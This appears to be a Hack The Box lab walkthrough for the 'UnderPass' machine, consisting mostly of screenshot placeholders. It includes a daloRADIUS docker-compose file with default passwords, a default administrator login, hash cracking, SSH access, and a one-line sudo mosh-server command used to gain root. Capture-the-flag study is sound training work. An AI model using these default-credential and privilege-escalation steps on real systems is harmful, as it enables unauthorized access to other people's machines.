
# HTB Walkthrough — Machine: UnderPass

**Target IP:** `10.10.11.48`  

**Author:** Miguel Reis  

**Difficulty:** Easy  

**OS:** Linux

![[Pasted image 20250207221310.png]]

![[Pasted image 20250207224725.png]]

![[Pasted image 20250207230132.png]]

![[Pasted image 20250207230211.png]]![[Pasted image 20250207230701.png]]

```yml
version: "3"

services:

  radius-mysql:
    image: mariadb:10
    container_name: radius-mysql
    restart: unless-stopped
    environment:
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      - MYSQL_ROOT_PASSWORD=radiusrootdbpw
    volumes:
      - "./data/mysql:/var/lib/mysql"

  radius:
    container_name: radius
    build:
      context: .
      dockerfile: Dockerfile-freeradius
    restart: unless-stopped
    depends_on: 
      - radius-mysql
    ports:
      - '1812:1812/udp'
      - '1813:1813/udp'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional settings
      - DEFAULT_CLIENT_SECRET=testing123
    volumes:
      - ./data/freeradius:/data
    # If you want to disable debug output, remove the command parameter
    command: -X

  radius-web:
    build: .
    container_name: radius-web
    restart: unless-stopped
    depends_on:
      - radius
      - radius-mysql
    ports:
      - '80:80'
      - '8000:8000'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional Settings:
      - DEFAULT_CLIENT_SECRET=testing123
      - DEFAULT_FREERADIUS_SERVER=radius
      - MAIL_SMTPADDR=127.0.0.1
      - MAIL_PORT=25
      - MAIL_FROM=root@daloradius.xdsl.by
      - MAIL_AUTH=

    volumes:
      - ./data/daloradius:/data

```

![[Pasted image 20250207231535.png]]

![[Pasted image 20250207231601.png]]

![[Pasted image 20250207233349.png]]

We get redirected to /operators/login.php
We use administrator:radius
Website to decrypt hashes:
https://crackstation.net

![[Pasted image 20250207233324.png]]

using ssh with the user and password found we get the user flag


![[Pasted image 20250207233758.png]]


https://mosh.org/

```bash
mosh --server="sudo /usr/bin/mosh-server" localhost
```

Arguments:
- -server="sudo /usr/bin/mosh-server" pecifies a custom command to run the Mosh server on the remote machine
- localhost:Specifies the target host for the Mosh connection, which in this case is localhost (i.e., the local machine).
This way we get root access to the machine.
